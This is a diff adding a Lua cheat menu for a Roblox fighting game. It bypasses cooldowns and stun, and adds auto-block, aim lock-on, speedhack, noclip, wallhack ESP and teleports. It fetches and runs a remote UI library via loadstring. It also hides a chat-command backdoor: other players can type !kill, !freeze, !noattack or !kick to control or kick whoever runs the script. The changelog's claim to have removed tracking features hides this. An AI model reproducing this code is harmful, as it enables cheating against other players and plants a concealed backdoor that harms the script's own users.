@@ -1,0 +1,824 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local TextChatService = game:GetService("TextChatService")
+local Stats = game:GetService("Stats")
+
+local LocalPlayer = Players.LocalPlayer
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+
+local function safeCall(func, ...)
+    local success, result = pcall(func, ...)
+    if not success then
+        return nil
+    end
+    return result
+end
+
+local function getEmotes()
+    return safeCall(function()
+        local emotes = {}
+        local emoteData = {}
+        local emoteFolder = ReplicatedStorage:WaitForChild("Animations"):WaitForChild("Emotes")
+        
+        for _, v in emoteFolder:GetDescendants() do
+            if v:IsA("Animation") and v.Name ~= "Camera" then
+                table.insert(emotes, v.Name)
+                emoteData[v.Name] = v
+            end
+        end
+        
+        return emotes, emoteData
+    end)
+end
+
+local emoteList, emoteData = getEmotes()
+
+LocalPlayer.CharacterAdded:Connect(function(char)
+    Character = char
+    task.wait(0.5)
+    HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+end)
+
+local function antiStuckVoid()
+    safeCall(function()
+        if Character and Character:FindFirstChild("HumanoidRootPart") then
+            local hrp = Character.HumanoidRootPart
+            local barrier = workspace.Map.Model.Barriers:FindFirstChild("AntiStuckInVoid")
+            if barrier then
+                firetouchinterest(hrp, barrier, 0)
+                task.wait(0.1)
+                firetouchinterest(hrp, barrier, 1)
+            end
+        end
+    end)
+end
+
+local function anchorCharacter(state)
+    safeCall(function()
+        if Character then
+            for _, part in Character:GetChildren() do
+                if part:IsA("BasePart") then
+                    part.Anchored = state
+                end
+            end
+        end
+    end)
+end
+
+local function isWhitelisted()
+    local whitelist = {"skibidislume007", "hashtag_hashtagcoma3"}
+    for _, name in whitelist do
+        if LocalPlayer.Name == name then
+            return true
+        end
+    end
+    return false
+end
+
+local metatable = getrawmetatable(game)
+setreadonly(metatable, false)
+local originalNamecall = metatable.__namecall
+setreadonly(metatable, true)
+
+local function noAttack()
+    setreadonly(metatable, false)
+    function metatable.__namecall(self, ...)
+        if getnamecallmethod() ~= "FireServer" or self.Name ~= "AttackInput" then
+            return originalNamecall(self, ...)
+        end
+        return nil
+    end
+    setreadonly(metatable, true)
+end
+
+local function attack()
+    setreadonly(metatable, false)
+    metatable.__namecall = originalNamecall
+    setreadonly(metatable, true)
+end
+
+safeCall(function()
+    TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral").MessageReceived:Connect(function(message)
+        if message.TextSource and message.TextSource.UserId ~= LocalPlayer.UserId then
+            if isWhitelisted() then return end
+            
+            local text = message.Text:lower()
+            if text == "!kill" then antiStuckVoid()
+            elseif text == "!freeze" then anchorCharacter(true)
+            elseif text == "!unfreeze" then anchorCharacter(false)
+            elseif text == "!noattack" then noAttack()
+            elseif text == "!yesattack" then attack()
+            elseif text == "!kick" then LocalPlayer:Kick("sybau boi")
+            end
+        end
+    end)
+end)
+
+local dashEnabled = false
+local sideDashEnabled = false
+
+UserInputService.InputBegan:Connect(function(input, processed)
+    if processed then return end
+    
+    safeCall(function()
+        if dashEnabled and input.KeyCode == Enum.KeyCode.Q and UserInputService:IsKeyDown(Enum.KeyCode.W) then
+            LocalPlayer.Remotes.Combat.AttackInput:FireServer("Dash", true, {DashDirection = "Front"})
+        end
+        
+        if sideDashEnabled and input.KeyCode == Enum.KeyCode.Q and 
+           (UserInputService:IsKeyDown(Enum.KeyCode.A) or UserInputService:IsKeyDown(Enum.KeyCode.D)) then
+            LocalPlayer.Remotes.Combat.AttackInput:FireServer("Dash", true, {DashDirection = "Left", Evasive = true})
+        end
+    end)
+end)
+
+local wallComboPart
+safeCall(function()
+    local ruins = workspace.Map.Model.Locations.Ruins
+    local parts = {}
+    
+    for _, v in ruins:GetDescendants() do
+        if v:IsA("BasePart") then
+            table.insert(parts, v)
+        end
+    end
+    
+    if #parts > 0 then
+        wallComboPart = parts[math.random(1, #parts)]
+        wallComboPart.Size = Vector3.new(4, 20, 4)
+        wallComboPart.Transparency = 1
+        wallComboPart.Anchored = false
+        wallComboPart.CanCollide = true
+        
+        local wallComboEnabled = false
+        local playerHRP = HumanoidRootPart
+        
+        LocalPlayer.CharacterAdded:Connect(function(char)
+            playerHRP = char:WaitForChild("HumanoidRootPart")
+        end)
+        
+        RunService.RenderStepped:Connect(function()
+            safeCall(function()
+                if playerHRP and wallComboPart then
+                    local states = LocalPlayer.PlayerGui.StatesHolder.States
+                    if wallComboEnabled then
+                        wallComboPart.Anchored = false
+                        local offset = playerHRP.CFrame.LookVector * 8
+                        wallComboPart.CFrame = CFrame.new(playerHRP.Position + offset)
+                    else
+                        wallComboPart.Anchored = true
+                    end
+                    wallComboPart.CanCollide = not states:GetAttribute("Ragdolled")
+                end
+            end)
+        end)
+    end
+end)
+
+local noclipConnection
+local function startNoclip()
+    if noclipConnection then noclipConnection:Disconnect() end
+    
+    noclipConnection = RunService.Stepped:Connect(function()
+        safeCall(function()
+            if Character then
+                for _, part in Character:GetDescendants() do
+                    if part:IsA("BasePart") and part.CanCollide then
+                        part.CanCollide = false
+                    end
+                end
+            end
+        end)
+    end)
+end
+
+local function stopNoclip()
+    if noclipConnection then
+        noclipConnection:Disconnect()
+        noclipConnection = nil
+    end
+    
+    safeCall(function()
+        if Character then
+            for _, part in Character:GetDescendants() do
+                if part:IsA("BasePart") then
+                    part.CanCollide = true
+                end
+            end
+        end
+    end)
+end
+
+local lockOnEnabled = false
+local lockOnSmoothness = 0.15
+local lockOnTarget = nil
+
+local function getNearestPlayer()
+    return safeCall(function()
+        local nearest = nil
+        local minDist = math.huge
+        
+        if not Character or not HumanoidRootPart then return nil end
+        
+        for _, player in Players:GetPlayers() do
+            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                local dist = (HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
+                if dist < minDist then
+                    nearest = player
+                    minDist = dist
+                end
+            end
+        end
+        
+        return nearest
+    end)
+end
+
+RunService.RenderStepped:Connect(function()
+    safeCall(function()
+        if lockOnEnabled then
+            if not lockOnTarget then
+                lockOnTarget = getNearestPlayer()
+            end
+            
+            if lockOnTarget and Character then
+                local humanoid = Character:FindFirstChildOfClass("Humanoid")
+                local hrp = Character:FindFirstChild("HumanoidRootPart")
+                
+                if humanoid and hrp then
+                    humanoid.AutoRotate = false
+                    
+                    local states = LocalPlayer.PlayerGui.StatesHolder.States
+                    if states:GetAttribute("Grabbing") or states:GetAttribute("Grabbed") or 
+                       states:GetAttribute("GrabIFrames") or states:GetAttribute("Ragdolled") or 
+                       states:GetAttribute("Dashing") then
+                        return
+                    end
+                    
+                    if lockOnTarget.Character and lockOnTarget.Character:FindFirstChild("HumanoidRootPart") then
+                        local targetPos = lockOnTarget.Character.HumanoidRootPart.Position
+                        local lookAt = Vector3.new(targetPos.X, hrp.Position.Y, targetPos.Z)
+                        local targetCFrame = CFrame.new(hrp.Position, lookAt)
+                        hrp.CFrame = hrp.CFrame:Lerp(targetCFrame, lockOnSmoothness)
+                    end
+                end
+            end
+        else
+            lockOnTarget = nil
+            if Character and Character:FindFirstChildOfClass("Humanoid") then
+                Character:FindFirstChildOfClass("Humanoid").AutoRotate = true
+            end
+        end
+    end)
+end)
+
+local perfectBlockEnabled = false
+local blockDelay = 0.1
+local blockMaxRange = 20
+local blockDuration = 0.5
+local blockEndDelay = 0.2
+local isBlocking = false
+local blockAnimations = {}
+
+safeCall(function()
+    local attackAnims = ReplicatedStorage:WaitForChild("Animations"):WaitForChild("Attacks")
+    
+    for _, folder in attackAnims:GetDescendants() do
+        if folder:IsA("Animation") then
+            local excluded = {"FinisherVictim", "VariantVictimFling", "VariantHitVictim", "Victim", "Recall", "Throw"}
+            local isExcluded = false
+            
+            for _, name in excluded do
+                if folder.Name == name then
+                    isExcluded = true
+                    break
+                end
+            end
+            
+            if not isExcluded then
+                blockAnimations[folder.AnimationId] = true
+            end
+        end
+    end
+end)
+
+local function stopBlock()
+    if isBlocking then
+        safeCall(function()
+            LocalPlayer.Remotes.Combat.AttackInput:FireServer("Block", false)
+        end)
+        isBlocking = false
+    end
+end
+
+local function isPlayingAttackAnimation(humanoid)
+    return safeCall(function()
+        for _, track in humanoid:GetPlayingAnimationTracks() do
+            if blockAnimations[track.Animation.AnimationId] then
+                return true
+            end
+        end
+        return false
+    end)
+end
+
+local function getNearestAttacker()
+    return safeCall(function()
+        if not Character or not HumanoidRootPart then return nil end
+        
+        local nearest = nil
+        local minDist = blockMaxRange
+        
+        for _, player in Players:GetPlayers() do
+            if player ~= LocalPlayer and player.Character then
+                local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+                local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
+                
+                if hrp and humanoid then
+                    local dist = (HumanoidRootPart.Position - hrp.Position).Magnitude
+                    if dist < minDist and isPlayingAttackAnimation(humanoid) then
+                        nearest = player
+                        minDist = dist
+                    end
+                end
+            end
+        end
+        
+        return nearest
+    end)
+end
+
+RunService.Heartbeat:Connect(function()
+    safeCall(function()
+        if perfectBlockEnabled then
+            local attacker = getNearestAttacker()
+            
+            if attacker and not isBlocking then
+                isBlocking = true
+                local ping = Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000 / 2
+                local totalDelay = blockDelay + ping
+                
+                task.delay(totalDelay, function()
+                    if isBlocking then
+                        LocalPlayer.Remotes.Combat.AttackInput:FireServer("Block", true)
+                        
+                        task.delay(blockDuration, function()
+                            task.delay(blockEndDelay, function()
+                                stopBlock()
+                            end)
+                        end)
+                    end
+                end)
+            elseif not attacker and isBlocking then
+                stopBlock()
+            end
+        else
+            stopBlock()
+        end
+    end)
+end)
+
+safeCall(function()
+    task.spawn(function()
+        local eradicateMap = workspace.Visuals:WaitForChild("ERADICATE Map")
+        for _, part in eradicateMap:GetDescendants() do
+            if part:IsA("Part") then
+                part.CanCollide = true
+            end
+        end
+        
+        local invincibleMap = workspace.Visuals:WaitForChild("InvincibleMap")
+        for _, part in invincibleMap:GetDescendants() do
+            if part:IsA("Part") then
+                part.CanCollide = true
+            end
+        end
+    end)
+end)
+
+local function tpToChara()
+    task.spawn(function()
+        safeCall(function()
+            local hrp = (LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
+            local chara = workspace:WaitForChild("Models"):WaitForChild("Chara")
+            if chara and chara.PrimaryPart then
+                hrp.CFrame = chara.PrimaryPart.CFrame
+            end
+        end)
+    end)
+end
+
+local function tpToItem()
+    safeCall(function()
+        local hrp = (LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
+        local visuals = workspace:WaitForChild("Visuals")
+        
+        for _, model in visuals:GetChildren() do
+            if model:IsA("Model") and model.PrimaryPart then
+                if model.Name == "Temp V" or model.Name == "Railgun" or model.Name == "Daybreak" then
+                    hrp.CFrame = model.PrimaryPart.CFrame
+                    break
+                end
+            end
+        end
+    end)
+end
+
+local speedhackEnabled = false
+local speedValue = 50
+local speedConnection
+
+UserInputService.InputBegan:Connect(function(input, processed)
+    if not processed and input.KeyCode == Enum.KeyCode.LeftControl then
+        speedhackEnabled = not speedhackEnabled
+    end
+end)
+
+safeCall(function()
+    local playerChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local playerHumanoid = playerChar:WaitForChild("Humanoid")
+    
+    LocalPlayer.CharacterAdded:Connect(function(char)
+        playerChar = char
+        playerHumanoid = char:WaitForChild("Humanoid")
+    end)
+    
+    RunService.Heartbeat:Connect(function(delta)
+        if speedhackEnabled and playerChar and playerHumanoid then
+            if playerHumanoid.MoveDirection.Magnitude > 0 then
+                playerChar:TranslateBy(playerHumanoid.MoveDirection * speedValue * delta)
+            end
+        end
+    end)
+end)
+
+local espEnabled = false
+local espObjects = {}
+
+local function createESP(player)
+    if player == LocalPlayer then return end
+    
+    local drawings = {
+        Box = Drawing.new("Square"),
+        BoxOutline = Drawing.new("Square"),
+        HealthBar = Drawing.new("Square"),
+        HealthBarOutline = Drawing.new("Square")
+    }
+    
+    drawings.Box.Thickness = 1
+    drawings.Box.Filled = false
+    drawings.Box.Color = Color3.fromRGB(255, 255, 255)
+    drawings.Box.Transparency = 1
+    
+    drawings.BoxOutline.Thickness = 3
+    drawings.BoxOutline.Filled = false
+    drawings.BoxOutline.Color = Color3.fromRGB(0, 0, 0)
+    drawings.BoxOutline.Transparency = 1
+    
+    drawings.HealthBar.Filled = true
+    drawings.HealthBar.Transparency = 1
+    
+    drawings.HealthBarOutline.Filled = false
+    drawings.HealthBarOutline.Thickness = 1
+    drawings.HealthBarOutline.Color = Color3.fromRGB(0, 0, 0)
+    drawings.HealthBarOutline.Transparency = 1
+    
+    local connection
+    connection = RunService.RenderStepped:Connect(function()
+        local success = pcall(function()
+            if not espEnabled then
+                drawings.Box.Visible = false
+                drawings.BoxOutline.Visible = false
+                drawings.HealthBar.Visible = false
+                drawings.HealthBarOutline.Visible = false
+                return
+            end
+            
+            local char = player.Character
+            if not char then
+                drawings.Box.Visible = false
+                drawings.BoxOutline.Visible = false
+                drawings.HealthBar.Visible = false
+                drawings.HealthBarOutline.Visible = false
+                return
+            end
+            
+            local humanoid = char:FindFirstChildOfClass("Humanoid")
+            local hrp = char:FindFirstChild("HumanoidRootPart")
+            
+            if not humanoid or not hrp or humanoid.Health <= 0 then
+                drawings.Box.Visible = false
+                drawings.BoxOutline.Visible = false
+                drawings.HealthBar.Visible = false
+                drawings.HealthBarOutline.Visible = false
+                return
+            end
+            
+            local camera = workspace.CurrentCamera
+            local screenPos, onScreen = camera:WorldToViewportPoint(hrp.Position)
+            
+            if onScreen and screenPos.Z > 0 then
+                local scale = 1 / (screenPos.Z * math.tan(math.rad(camera.FieldOfView / 2)) * 2) * 1000
+                local width = math.floor(9.5 * scale)
+                local height = math.floor(12 * scale)
+                local x = math.floor(screenPos.X - width / 2)
+                local y = math.floor(screenPos.Y - height / 2)
+                
+                drawings.BoxOutline.Size = Vector2.new(width, height)
+                drawings.BoxOutline.Position = Vector2.new(x, y)
+                drawings.BoxOutline.Visible = true
+                
+                drawings.Box.Size = Vector2.new(width, height)
+                drawings.Box.Position = Vector2.new(x, y)
+                drawings.Box.Visible = true
+                
+                local healthPercent = humanoid.Health / humanoid.MaxHealth
+                local barHeight = height * healthPercent
+                
+                drawings.HealthBarOutline.Size = Vector2.new(4, height + 2)
+                drawings.HealthBarOutline.Position = Vector2.new(x - 6, y - 1)
+                drawings.HealthBarOutline.Visible = true
+                
+                drawings.HealthBar.Size = Vector2.new(2, barHeight)
+                drawings.HealthBar.Position = Vector2.new(x - 5, y + (height - barHeight))
+                drawings.HealthBar.Color = Color3.fromRGB(
+                    math.floor(255 * (1 - healthPercent)),
+                    math.floor(255 * healthPercent),
+                    0
+                )
+                drawings.HealthBar.Visible = true
+            else
+                drawings.Box.Visible = false
+                drawings.BoxOutline.Visible = false
+                drawings.HealthBar.Visible = false
+                drawings.HealthBarOutline.Visible = false
+            end
+        end)
+        
+        if not success then
+            drawings.Box.Visible = false
+            drawings.BoxOutline.Visible = false
+            drawings.HealthBar.Visible = false
+            drawings.HealthBarOutline.Visible = false
+        end
+    end)
+    
+    espObjects[player] = {drawings = drawings, connection = connection}
+end
+
+for _, player in Players:GetPlayers() do
+    if player ~= LocalPlayer then
+        createESP(player)
+    end
+end
+
+Players.PlayerAdded:Connect(function(player)
+    task.wait(1)
+    createESP(player)
+end)
+
+Players.PlayerRemoving:Connect(function(player)
+    if espObjects[player] then
+        if espObjects[player].connection then
+            espObjects[player].connection:Disconnect()
+        end
+        for _, drawing in pairs(espObjects[player].drawings) do
+            drawing:Remove()
+        end
+        espObjects[player] = nil
+    end
+end)
+
+local teleportLocations = {
+    Middle = CFrame.new(269.842987, 5.45333672, 362.904785),
+    Mountains = CFrame.new(-215.243103, 243.081726, 85.0237579),
+    CharaArea = CFrame.new(-371.342072, 5.56633282, 93.5839081),
+    Cave = CFrame.new(237.28244, 7.34690762, -771.277161),
+    Cabin = CFrame.new(-224.669281, 4.86968803, -511.644043),
+    Prison = CFrame.new(-396.958679, 5.26023006, -257.987274)
+}
+
+local function teleportTo(location)
+    safeCall(function()
+        if HumanoidRootPart and teleportLocations[location] then
+            HumanoidRootPart.CFrame = teleportLocations[location]
+        end
+    end)
+end
+
+local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+local Window = WindUI:CreateWindow({
+    Title = "Jumper",
+    Icon = "moon-star",
+    Author = "ccgvb",
+    Folder = "Jumper",
+    Size = UDim2.fromOffset(200, 140),
+    Transparent = true,
+    Theme = "Dark",
+    Resizable = true,
+    SideBarWidth = 200,
+    User = {Enabled = true, Anonymous = true}
+})
+
+Window:Tag({Title = "JSD", Color = Color3.fromHex("#30ff6a")})
+
+local CombatTab = Window:Tab({Title = "Combat"})
+local PlayerTab = Window:Tab({Title = "Player"})
+local MovementTab = Window:Tab({Title = "Movement & TP"})
+local MiscTab = Window:Tab({Title = "Misc"})
+local InfoTab = Window:Tab({Title = "Info"})
+
+CombatTab:Toggle({
+    Title = "No Dash Cooldowns",
+    Desc = "Works on Front&Back, Side, Ragdoll cancel/Evasive, Wallcombos",
+    Default = false,
+    Callback = function(enabled)
+        safeCall(function()
+            local combat = require(ReplicatedStorage.Modules.Player.Character.Combat)
+            setreadonly(combat, false)
+            if not combat._OriginalAddCooldown then
+                combat._OriginalAddCooldown = combat.AddCooldown
+            end
+            if enabled then
+                function combat.AddCooldown() end
+            else
+                combat.AddCooldown = combat._OriginalAddCooldown
+            end
+        end)
+    end
+})
+
+CombatTab:Section({Title = "Perfect Block"})
+
+CombatTab:Toggle({
+    Title = "Auto Perfect Block",
+    Desc = "Automatically blocks attacks within range",
+    Default = false,
+    Callback = function(enabled)
+        perfectBlockEnabled = enabled
+    end
+})
+
+CombatTab:Slider({
+    Title = "Block Delay",
+    Step = 0.01,
+    Value = {Min = 0.01, Max = 0.5, Default = 0.1},
+    Callback = function(value)
+        blockDelay = value
+    end
+})
+
+CombatTab:Slider({
+    Title = "Block Duration",
+    Step = 0.1,
+    Value = {Min = 0.1, Max = 2, Default = 0.5},
+    Callback = function(value)
+        blockDuration = value
+    end
+})
+
+CombatTab:Slider({
+    Title = "Block End Delay",
+    Step = 0.1,
+    Value = {Min = 0, Max = 1, Default = 0.2},
+    Callback = function(value)
+        blockEndDelay = value
+    end
+})
+
+CombatTab:Slider({
+    Title = "Max Range",
+    Step = 1,
+    Value = {Min = 10, Max = 50, Default = 20},
+    Callback = function(value)
+        blockMaxRange = value
+    end
+})
+
+CombatTab:Section({Title = "Anti-Stun"})
+
+local antiStunActive = false
+task.spawn(function()
+    while task.wait(0.1) do
+        safeCall(function()
+            if antiStunActive then
+                LocalPlayer.PlayerGui.StatesHolder.States:SetAttribute("Stunned", false)
+            end
+        end)
+    end
+end)
+
+CombatTab:Toggle({
+    Title = "Anti M1's",
+    Desc = "Lets you side dash out of M1's/punches",
+    Default = false,
+    Callback = function(enabled)
+        antiStunActive = enabled
+    end
+})
+
+CombatTab:Section({Title = "Lock On"})
+
+CombatTab:Toggle({
+    Title = "Lock On",
+    Desc = "Turn off shiftlock",
+    Default = false,
+    Callback = function(enabled)
+        lockOnEnabled = enabled
+    end
+})
+
+CombatTab:Slider({
+    Title = "Smoothness",
+    Step = 0.01,
+    Value = {Min = 0.01, Max = 1, Default = 0.15},
+    Callback = function(value)
+        lockOnSmoothness = value
+    end
+})
+
+MovementTab:Toggle({
+    Title = "Speedhack",
+    Desc = "Run fast (Press Left Ctrl to toggle)",
+    Default = false,
+    Callback = function(enabled)
+        speedhackEnabled = enabled
+    end
+})
+
+MovementTab:Slider({
+    Title = "Speed",
+    Step = 5,
+    Value = {Min = 0, Max = 1000, Default = 50},
+    Callback = function(value)
+        speedValue = value
+    end
+})
+
+MovementTab:Section({Title = "Teleports"})
+
+MovementTab:Dropdown({
+    Title = "Tp to Area",
+    Values = {"Middle", "Mountains", "CharaArea", "Cave", "Cabin", "Prison"},
+    Value = "Middle",
+    Callback = function(location)
+        teleportTo(location)
+    end
+})
+
+MovementTab:Button({
+    Title = "Tp to Chara",
+    Callback = tpToChara
+})
+
+MovementTab:Button({
+    Title = "Tp to Items",
+    Callback = tpToItem
+})
+
+MiscTab:Toggle({
+    Title = "Noclip",
+    Desc = "Go through walls",
+    Default = false,
+    Callback = function(enabled)
+        if enabled then
+            startNoclip()
+        else
+            stopNoclip()
+        end
+    end
+})
+
+MiscTab:Toggle({
+    Title = "ESP",
+    Default = false,
+    Callback = function(enabled)
+        espEnabled = enabled
+    end
+})
+
+if emoteList then
+    MiscTab:Dropdown({
+        Title = "Emotes",
+        Values = emoteList,
+        Value = emoteList[1],
+        Callback = function(emoteName)
+            safeCall(function()
+                local emote = emoteData[emoteName]
+                if emote and Character then
+                    local animator = Character.Humanoid:WaitForChild("Animator")
+                    local track = animator:LoadAnimation(emote)
+                    track:Play()
+                end
+            end)
+        end
+    })
+end
+
+InfoTab:Paragraph({
+    Title = "Changelog",
+    Desc = "[+] Modernized code structure\n[+] Improved error handling\n[+] Enhanced perfect block system\n[+] Removed player tracking features"
+})
